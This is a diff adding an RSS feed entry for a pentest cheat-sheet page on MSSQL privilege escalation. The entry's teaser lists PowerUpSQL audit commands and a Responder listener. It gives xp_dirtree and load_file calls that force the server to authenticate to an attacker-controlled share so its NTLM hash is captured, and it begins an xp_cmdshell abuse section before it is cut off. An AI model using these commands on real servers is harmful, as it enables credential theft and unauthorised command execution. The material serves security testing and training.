@@ -8,6 +8,13 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@sid/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>MSSQL Privilege Escalation</title>
+      <link>https://tldrbins.github.io/mssql_privilege_escalation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/mssql_privilege_escalation/</guid>
+      <description>Enum 1. Import Module . .\PowerUpSQL.ps1 2. Audit Invoke-SQLAudit -Instance &amp;lt;TARGET&amp;gt; -Username &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -Password &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -Verbose 3. Execute Query Get-SQLQuery -Instance &amp;lt;TARGET&amp;gt; -Username &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -Password &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -Query &amp;#34;&amp;lt;QUERY&amp;gt;&amp;#34; -Verbose Ref: PowerUpSQL.ps1&#xA;Abuse #1: Steal NTLM hash 1. Start a Listener sudo responder -I tun0 2. Coercing Authentication Method 1 Method 2 Method 3 xp_dirtree &amp;#39;\\&amp;lt;LOCAL_IP&amp;gt;\any\thing&amp;#39;; use master; exec xp_dirtree &amp;#39;\\&amp;lt;LOCAL_IP&amp;gt;\any\thing&amp;#39;; load_file(&amp;#39;\\&amp;lt;LOCAL_IP&amp;gt;\any\thing&amp;#39;); Abuse #2: Run xp_cmdshell 1. Check Any Policy Blocking xp_cmdshell [Optional] select name from sys.</description>
+    </item>
+    <item>
       <title>RPC</title>
       <link>https://tldrbins.github.io/rpc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
